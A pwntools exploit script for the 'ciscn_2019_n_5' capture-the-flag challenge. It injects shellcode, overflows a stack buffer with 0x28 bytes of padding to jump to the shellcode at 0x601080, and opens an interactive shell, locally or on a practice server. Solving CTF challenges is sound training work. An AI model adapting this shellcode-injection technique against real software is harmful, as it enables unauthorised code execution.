import sys
from pwn import *
context.log_level='debug'
context.arch='amd64'
while True :
	#try :
		if len(sys.argv)==1 :
			io=process('./ciscn_2019_n_5')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_2019_n_5')
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
		else :
			io=remote('node3.buuoj.cn',28715)
			elf=ELF('ciscn_2019_n_5')
			#libc=ELF('./libc.so')


		io.recv()
		pay=asm(shellcraft.sh())
		io.sendline(pay)
		io.recv()
		pay='a'*0x28+p64(0x601080)
		io.sendline(pay)
		#gdb.attach(io)
		#pause()
		io.interactive()
	#except Exception as e:
		#raise e
	#else:
		#pass